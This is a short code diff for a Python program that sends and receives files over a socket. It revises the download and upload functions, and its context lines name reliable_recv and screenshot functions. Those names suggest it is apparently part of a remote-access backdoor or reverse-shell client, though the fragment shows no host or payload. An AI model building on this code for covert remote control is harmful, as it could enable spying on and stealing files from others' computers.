@@ -566,30 +566,25 @@ def reliable_recv():
         except ValueError:
             continue
 
-def download_file(file_name):
 
+def download_file(file_name):
     f = open(file_name, 'wb')
     s.settimeout(1)
     chunk = s.recv(1024)
-    if chunk.decode() == "fnfound":
-        s.send("[-] file not found".encode())
-        s.settimeout(None)
-    else:
-        while chunk:
-            f.write(chunk)
-            try:
-                chunk = s.recv(1024)
-            except Exception as e:
-                break
-
-
+    while chunk:
+        f.write(chunk)
+        try:
+            chunk = s.recv(1024)
+        except socket.timeout as e:
+            break
+    s.settimeout(None)
+    f.close()
 
 
 def upload_file(file_name):
-    if isfile(file_name) == True  :
-
-        f = open(file_name, 'rb')
-        s.send(f.read())
+    f = open(file_name, 'rb')
+    s.send(f.read())
+    f.close()
 
 
 def screenshot():
